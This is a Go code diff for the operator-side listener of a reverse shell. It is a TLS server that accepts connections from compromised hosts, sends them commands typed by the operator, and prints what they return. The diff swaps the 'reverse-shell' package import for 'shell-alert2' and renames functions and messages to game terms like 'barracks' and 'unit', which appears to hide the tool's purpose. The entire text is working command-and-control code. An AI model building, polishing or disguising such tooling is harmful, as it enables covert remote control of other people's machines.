@@ -8,10 +8,9 @@ import (
 	"log"
 	"net"
 	"os"
-	"runtime"
 	"strings"
 
-	reverse "github.com/justin-p/reverse-shell/pkg"
+	reverse "github.com/justin-p/shell-alert2/pkg"
 )
 
 var (
@@ -20,6 +19,7 @@ var (
 )
 
 func main() {
+	fmt.Printf("[*] Building ... \n")
 	if len(os.Args) == 2 {
 		if certFile, keyFile, err := reverse.GenCerts(); err == nil {
 			cert, err := tls.LoadX509KeyPair(certFile, keyFile)
@@ -30,50 +30,51 @@ func main() {
 				Certificates: []tls.Certificate{cert},
 			}
 
+			fmt.Printf("[*] Construction complete\n")
 			host := ""
 			port := os.Args[1]
 			listener, err := tls.Listen("tcp", net.JoinHostPort(host, port), &config)
 
 			if err != nil {
-				log.Fatalf("Listen error : %s", err)
+				log.Fatalf("[X] Cannot deploy here: %s", err)
 			}
 			defer listener.Close()
 
 			for {
-				conn, err := listener.Accept()
+				unit, err := listener.Accept()
 				if err != nil {
-					log.Printf("Server accept err: %s", err)
+					log.Printf("[!] Unit lost: %s", err)
 					break
 				}
-				go handleConnection(conn)
+				go barracks(unit)
 			}
 		}
 	} else {
-		fmt.Printf("Usage:\nserver-%s <local-port>\n", runtime.GOOS)
+		fmt.Printf("[X] Unable to comply:\nbarracks <port>\n")
 	}
 }
 
-func handleConnection(conn net.Conn) {
-	println(" Got Connection ...")
-	defer conn.Close()
+func barracks(unit net.Conn) {
+	println("[*] Unit ready\n")
+	defer unit.Close()
 
 	stdin := os.Stdin
 	reader := bufio.NewReader(stdin)
-	writer := bufio.NewWriter(conn)
-	go func() {
+	writer := bufio.NewWriter(unit)
 
+	go func() {
 		for {
 			if command, err := reader.ReadString('\n'); err == nil {
 				if _, err := writer.WriteString(fmt.Sprintf("%s\n", command)); err == nil {
 					writer.Flush()
 				} else {
-					log.Fatalf("Error: %s", err)
+					log.Fatalf("Unit lost: %s", err)
 				}
 			}
 		}
 	}()
 
-	connRead := bufio.NewReader(conn)
+	connRead := bufio.NewReader(unit)
 	for {
 		if output, err := connRead.ReadString(terminator); err == nil {
 			processOutput(output)
